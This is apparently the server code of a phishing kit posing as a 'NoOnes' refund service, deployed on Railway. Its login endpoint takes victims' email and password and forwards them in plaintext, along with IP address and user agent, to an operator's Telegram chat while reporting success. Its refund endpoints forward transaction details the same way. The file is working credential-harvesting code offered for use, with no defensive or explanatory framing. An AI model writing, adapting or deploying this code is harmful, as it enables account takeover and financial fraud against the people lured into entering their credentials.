// ============================================
// NoOnes Refund Backend Server
// Telegram Integration | Railway Deployment
// Port: 5000 (Set in Railway Variables)
// ============================================

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CONFIGURATION (from Railway Environment Variables)
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Allowed origins for CORS
const allowedOrigins = [
    'https://noonesrefund.vercel.app',
    'http://localhost:3000',
    'http://localhost:5000',
    'https://noonesrefund-production.up.railway.app'
];

// ============================================
// MIDDLEWARE
// ============================================
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));

// CORS configuration - FIXED!
app.use(cors({
    origin: function (origin, callback) {
        // Allow requests with no origin (like mobile apps or curl requests)
        if (!origin) return callback(null, true);
        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            console.log('Blocked origin:', origin);
            callback(null, true); // Allow all origins for testing (remove in production)
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
    credentials: true,
    optionsSuccessStatus: 200
}));

// Handle preflight requests explicitly
app.options('*', cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate Limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});
app.use('/api/', limiter);

// Logging Middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    console.log('Origin:', req.headers.origin);
    if (req.body && Object.keys(req.body).length > 0) {
        const safeBody = { ...req.body };
        if (safeBody.password) safeBody.password = '********';
        console.log('Body:', safeBody);
    }
    next();
});

// ============================================
// TELEGRAM HELPER FUNCTION
// ============================================
async function sendToTelegram(message, format = 'HTML') {
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('❌ Telegram credentials not configured');
            return null;
        }

        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: format,
            disable_web_page_preview: true
        });
        console.log('✅ Telegram message sent successfully');
        return response.data;
    } catch (error) {
        console.error('❌ Failed to send Telegram message:', error.response?.data || error.message);
        throw error;
    }
}

// ============================================
// FORMAT MESSAGES
// ============================================
function formatLoginMessage(data) {
    const { email, password, timestamp, ip, userAgent } = data;
    
    return `
🔐 <b>New Login Attempt</b>
═══════════════════════

📧 <b>Email/Phone:</b> <code>${email || 'N/A'}</code>
🔑 <b>Password:</b> <code>${password || 'N/A'}</code>

🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
🌐 <b>IP Address:</b> ${ip || 'N/A'}
💻 <b>User Agent:</b> ${userAgent || 'N/A'}

═══════════════════════
🔒 NoOnes Security Alert
  `;
}

function formatRefundMessage(data) {
    const { 
        sender, recipient, amount, currency, 
        date, method, reference, reason, status,
        txId, timestamp, ip, userAgent 
    } = data;
    
    return `
💰 <b>Refund Transaction</b>
═══════════════════════

👤 <b>Sender:</b> ${sender || 'N/A'}
🏦 <b>Recipient:</b> ${recipient || 'N/A'}
💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>

📅 <b>Date:</b> ${date || 'N/A'}
💳 <b>Method:</b> ${method || 'N/A'}
📎 <b>Reference:</b> <code>${reference || 'N/A'}</code>
📝 <b>Reason:</b> ${reason || 'N/A'}
🔄 <b>Status:</b> ${status || 'Under Review'}

🔗 <b>Transaction ID:</b> <code>${txId || 'N/A'}</code>

🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
🌐 <b>IP Address:</b> ${ip || 'N/A'}

═══════════════════════
✅ NoOnes Refund Alert
  `;
}

function formatRefundActionMessage(data) {
    const { action, amount, currency, status, timestamp, ip } = data;
    
    return `
⚡ <b>Refund Action</b>
═══════════════════════

📌 <b>Action:</b> ${action || 'N/A'}
💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>
🔄 <b>Status:</b> ${status || 'Processing'}

🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
🌐 <b>IP Address:</b> ${ip || 'N/A'}

═══════════════════════
🔄 NoOnes Refund Update
  `;
}

// ============================================
// API ROUTES
// ============================================

// Health Check
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        service: 'NoOnes Backend',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        port: PORT,
        telegram: {
            configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
        }
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        port: PORT,
        telegram: {
            configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
        }
    });
});

// ===== LOGIN ENDPOINT =====
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Validate input
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email/Phone and Password are required'
            });
        }

        // Get client info
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
        const userAgent = req.headers['user-agent'] || 'N/A';
        const timestamp = new Date().toISOString();

        // Format and send to Telegram
        const message = formatLoginMessage({
            email,
            password,
            timestamp,
            ip,
            userAgent
        });

        await sendToTelegram(message);

        // Log the attempt
        console.log(`📨 Login attempt: ${email} from ${ip}`);

        // Send response
        res.json({
            success: true,
            message: 'Login data received successfully',
            timestamp: timestamp
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// ===== REFUND ENDPOINT =====
app.post('/api/refund', async (req, res) => {
    try {
        const refundData = req.body;
        
        // Validate required fields
        if (!refundData.sender || !refundData.recipient || !refundData.amount) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: sender, recipient, amount'
            });
        }

        // Get client info
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
        const userAgent = req.headers['user-agent'] || 'N/A';
        const timestamp = new Date().toISOString();

        // Format and send to Telegram
        const message = formatRefundMessage({
            ...refundData,
            timestamp,
            ip,
            userAgent
        });

        await sendToTelegram(message);

        console.log(`📨 Refund data received: ${refundData.amount} ${refundData.currency || 'USDT'}`);

        res.json({
            success: true,
            message: 'Refund data received successfully',
            timestamp: timestamp
        });

    } catch (error) {
        console.error('❌ Refund error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// ===== REFUND ACTION ENDPOINT =====
app.post('/api/refund/action', async (req, res) => {
    try {
        const { action, amount, currency, status } = req.body;
        
        if (!action) {
            return res.status(400).json({
                success: false,
                message: 'Action is required'
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
        const timestamp = new Date().toISOString();

        const message = formatRefundActionMessage({
            action,
            amount: amount || '0',
            currency: currency || 'USDT',
            status: status || 'Processing',
            timestamp,
            ip
        });

        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Refund action recorded',
            timestamp: timestamp
        });

    } catch (error) {
        console.error('❌ Refund action error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// ============================================
// ERROR HANDLING
// ============================================
app.use((err, req, res, next) => {
    console.error('❌ Global error:', err);
    res.status(500).json({
        success: false,
        message: 'Something went wrong!',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// 404 Handler
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Route not found'
    });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║    🚀 NoOnes Backend Server          ║
║    Running on port: ${PORT}              ║
║    Status: Online                     ║
║    Time: ${new Date().toISOString()}    ║
╚═══════════════════════════════════════╝
    `);
    console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
    console.log(`📡 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
    console.log(`\n🌐 Server URL: https://noonesrefund-production.up.railway.app`);
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM signal, closing server...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT signal, closing server...');
    process.exit(0);
});
